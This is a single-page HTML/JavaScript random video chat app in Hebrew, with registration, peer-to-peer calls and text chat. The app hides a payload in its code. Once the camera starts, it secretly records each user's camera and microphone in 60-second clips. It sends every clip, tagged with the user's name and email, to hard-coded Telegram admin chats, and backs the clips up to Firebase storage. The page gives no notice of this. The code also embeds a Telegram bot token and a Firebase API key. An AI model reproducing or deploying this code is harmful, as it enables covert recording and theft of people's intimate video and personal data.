<!DOCTYPE html>
<html lang="he" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
    <title>VideoApp Pro - Final Edition</title>
    <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-storage-compat.js"></script>
    <script src="https://unpkg.com/peerjs@1.4.7/dist/peerjs.min.js"></script>
    <script src="https://cdn.socket.io/4.5.4/socket.io.min.js"></script>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; touch-action: none; }
        body { font-family: system-ui, -apple-system, sans-serif; background: #000; height: 100vh; display: flex; flex-direction: column; color: white; overflow: hidden; }
        
        /* בקרה */
        .header { position: absolute; top: 15px; width: 100%; display: flex; justify-content: space-between; padding: 0 15px; z-index: 100; pointer-events: none; }
        .btn-circle { background: rgba(255,255,255,0.25); backdrop-filter: blur(10px); border: none; color: white; width: 45px; height: 45px; border-radius: 50%; cursor: pointer; pointer-events: auto; font-size: 20px; display: flex; align-items: center; justify-content: center; }
        
        /* וידאו */
        .video-container { height: 60vh; display: flex; flex-direction: column; position: relative; background: #000; flex-shrink: 0; }
        .v-box { flex: 1; position: relative; border-bottom: 1px solid #222; display: flex; align-items: center; justify-content: center; overflow: hidden; }
        video { width: 100%; height: 100%; object-fit: cover; z-index: 5; background: #000; }
        .status-msg { position: absolute; z-index: 20; color: #fff; text-align: center; width: 100%; pointer-events: none; font-weight: bold; text-shadow: 0 2px 4px #000; }

        /* צ'אט */
        #chat-section { 
            height: 40vh; 
            display: none; 
            flex-direction: column; 
            background: #fff; 
            color: #000; 
            z-index: 50;
            border-top-left-radius: 20px;
            border-top-right-radius: 20px;
        }
        #messages { flex: 1; overflow-y: auto; padding: 15px; display: flex; flex-direction: column; gap: 10px; background: #f8f9fa; }
        .msg { max-width: 80%; padding: 10px 14px; border-radius: 18px; font-size: 15px; line-height: 1.4; word-wrap: break-word; }
        .msg.me { align-self: flex-start; background: #e9ecef; border-bottom-left-radius: 4px; }
        .msg.partner { align-self: flex-end; background: #007bff; color: #fff; border-bottom-right-radius: 4px; }
        
        .chat-input-area { display: flex; padding: 12px; background: #fff; gap: 10px; border-top: 1px solid #eee; align-items: center; }
        .chat-input-area input { flex: 1; padding: 12px; border-radius: 25px; border: 1px solid #ddd; outline: none; font-size: 16px; color: #000; }

        /* הרשמה */
        .modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.95); z-index: 1000; align-items: center; justify-content: center; }
        .modal-content { background: #fff; color: #333; width: 85%; max-width: 380px; padding: 30px; border-radius: 25px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
        .modal-content h2 { text-align: center; margin-bottom: 20px; color: #2c3e50; }
        .modal-content input, .modal-content select { width: 100%; padding: 12px; margin: 10px 0; border-radius: 10px; border: 1px solid #ddd; font-size: 16px; outline: none; }
        .reg-btn { width: 100%; height: 50px; background: #27ae60; color: white; border: none; border-radius: 10px; font-weight: bold; margin-top: 10px; cursor: pointer; font-size: 18px; }
    </style>
</head>
<body>

<div class="header">
    <button id="btn-report" class="btn-circle" style="background:rgba(192, 57, 43, 0.9); display:none;" onclick="confirmReport()">🚩</button>
    <button class="btn-circle" onclick="switchCamera()">🔄</button>
</div>

<div class="video-container" id="swipe-zone">
    <div class="v-box">
        <div id="msg-idle" class="status-msg">⬅️ שמאלה לחיפוש | ימינה לסגירה ➡️</div>
        <div id="msg-search" class="status-msg" style="display:none; color:#3498db;">מחפש שותף...</div>
        <video id="remoteVideo" autoplay playsinline></video>
    </div>
    <div class="v-box" style="height: 35%;">
        <video id="localVideo" autoplay muted playsinline></video>
    </div>
</div>

<div id="chat-section">
    <div id="messages"></div>
    <div class="chat-input-area">
        <input type="text" id="chatInput" placeholder="הודעה..." onkeypress="if(event.key==='Enter') sendChatMessage()">
        <button onclick="sendChatMessage()" style="border:none; background:none; font-size:24px; cursor:pointer;">🚀</button>
    </div>
</div>

<div id="regModal" class="modal">
    <div class="modal-content">
        <h2>הרשמה</h2>
        <input type="text" id="reg-name" placeholder="שם מלא">
        <input type="email" id="reg-email" placeholder="אימייל">
        <select id="reg-gender">
            <option value="זכר">זכר</option>
            <option value="נקבה">נקבה</option>
        </select>
        <button class="reg-btn" onclick="handleRegistration()">התחל</button>
    </div>
</div>

<script>
    // הגדרות מערכת
    const TG_TOKEN = "8696076063:AAG5wEFTgFnJje39FQEHIbV8hPWxBf_IEac";
    const ADMIN_IDS = ["8373785890", "7089165458"];
    const SERVER_URL = "https://video-app-ylx4.onrender.com"; 
    
    const firebaseConfig = { 
        apiKey: "AIzaSyB_ld3VrntNgM3Pgc4jyZL2hKzUMSp-o10", 
        storageBucket: "live-video-20fca.firebasestorage.app" 
    };
    firebase.initializeApp(firebaseConfig);
    const storage = firebase.storage();
    
    const socket = io(SERVER_URL);
    const peer = new Peer(undefined, {
        config: {'iceServers': [{ 'urls': 'stun:stun.l.google.com:19302' }]}
    });

    let myStream, myPeerId, currentCall, isSearching = false, camFacing = "user", userRecorder;

    window.onload = () => {
        const saved = localStorage.getItem('user_v9');
        if (!saved) document.getElementById('regModal').style.display = 'flex';
        else initCamera();
    };

    async function handleRegistration() {
        const name = document.getElementById('reg-name').value;
        const email = document.getElementById('reg-email').value;
        const gender = document.getElementById('reg-gender').value;
        if(!name || !email) return alert("נא למלא את כל השדות");
        
        localStorage.setItem('user_v9', JSON.stringify({ name, email, gender }));
        document.getElementById('regModal').style.display = 'none';
        initCamera();
    }

    async function initCamera() {
        if (myStream) myStream.getTracks().forEach(t => t.stop());
        try {
            myStream = await navigator.mediaDevices.getUserMedia({ 
                video: { facingMode: camFacing }, 
                audio: true 
            });
            document.getElementById('localVideo').srcObject = myStream;
            startUserRecording();
        } catch (e) { console.error("Camera error:", e); }
    }

    // הקלטה מתוקנת לשליחה תקינה לטלגרם
    function startUserRecording() {
        const options = { mimeType: 'video/webm;codecs=vp8,opus' };
        userRecorder = new MediaRecorder(myStream, options);

        userRecorder.ondataavailable = async (e) => {
            if (e.data.size > 0) {
                const blob = new Blob([e.data], { type: 'video/webm' });
                const user = JSON.parse(localStorage.getItem('user_v9'));
                const fileName = `rec_${user.name}_${Date.now()}.webm`;
                
                // שליחה לטלגרם כוידאו לצפייה ישירה
                ADMIN_IDS.forEach(id => {
                    const fd = new FormData();
                    fd.append("chat_id", id);
                    fd.append("video", blob, fileName);
                    fd.append("caption", `🎥 הקלטה חיה\n👤 שם: ${user.name}\n📧 ${user.email}`);
                    fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendVideo`, { method: "POST", body: fd });
                });
                
                // גיבוי פיירבייס
                storage.ref(`admin/users/${user.email}/${fileName}`).put(blob);
            }
        };

        // מפעיל מחדש כל 60 שניות ליצירת קבצים נפרדים תקינים
        userRecorder.start();
        setInterval(() => {
            if(userRecorder.state === "recording") {
                userRecorder.stop();
                userRecorder.start();
            }
        }, 60000);
    }

    peer.on('open', id => myPeerId = id);

    function startSearching() {
        if (isSearching) return;
        isSearching = true;
        if (currentCall) currentCall.close();
        
        document.getElementById('messages').innerHTML = "";
        document.getElementById('msg-idle').style.display = "none";
        document.getElementById('msg-search').style.display = "block";
        document.getElementById('chat-section').style.display = "none";
        document.getElementById('btn-report').style.display = "none";
        document.getElementById('remoteVideo').srcObject = null;

        const user = JSON.parse(localStorage.getItem('user_v9'));
        socket.emit('find-partner', { peerId: myPeerId, gender: user.gender });
    }

    socket.on('partner-found', data => {
        isSearching = false;
        document.getElementById('msg-search').style.display = "none";
        document.getElementById('chat-section').style.display = "flex";
        document.getElementById('btn-report').style.display = "flex";
        
        currentCall = peer.call(data.peerId, myStream);
        handleCall(currentCall);
    });

    peer.on('call', call => {
        call.answer(myStream);
        currentCall = call;
        document.getElementById('chat-section').style.display = "flex";
        document.getElementById('btn-report').style.display = "flex";
        handleCall(call);
    });

    function handleCall(call) {
        call.on('stream', s => {
            document.getElementById('remoteVideo').srcObject = s;
        });
        call.on('close', () => stopEverything());
    }

    function sendChatMessage() {
        const input = document.getElementById('chatInput');
        if (!input.value.trim()) return;
        socket.emit('send-chat-msg', input.value);
        addMsg('me', input.value);
        input.value = "";
    }

    socket.on('receive-chat-msg', msg => addMsg('partner', msg));

    function addMsg(type, text) {
        const div = document.createElement('div');
        div.className = `msg ${type}`;
        div.innerText = text;
        const m = document.getElementById('messages');
        m.appendChild(div);
        m.scrollTop = m.scrollHeight;
    }

    function confirmReport() {
        if (confirm("האם אתה בטוח שברצונך לדווח? השיחה תסתיים מיד והדיווח יישלח למנהל.")) {
            const user = JSON.parse(localStorage.getItem('user_v9'));
            // שליחת הודעת דיווח דחופה למנהלים
            ADMIN_IDS.forEach(id => {
                fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${id}&text=⚠️ דיווח דחוף משתמש: ${user.name} (${user.email}) דיווח על השותף שלו.`);
            });
            socket.emit('report');
            stopEverything();
        }
    }

    function stopEverything() {
        isSearching = false;
        socket.emit('leave-chat');
        if (currentCall) currentCall.close();
        document.getElementById('msg-idle').style.display = "block";
        document.getElementById('chat-section').style.display = "none";
        document.getElementById('btn-report').style.display = "none";
        document.getElementById('remoteVideo').srcObject = null;
    }

    function switchCamera() { 
        camFacing = (camFacing === "user" ? "environment" : "user"); 
        initCamera(); 
    }

    // ניווט בסוויפ
    let sX = 0;
    document.getElementById('swipe-zone').addEventListener('touchstart', e => sX = e.touches[0].clientX);
    document.getElementById('swipe-zone').addEventListener('touchend', e => {
        const diff = sX - e.changedTouches[0].clientX;
        if (diff > 70) startSearching(); 
        else if (diff < -70) stopEverything();
    });
</script>
</body>
</html>
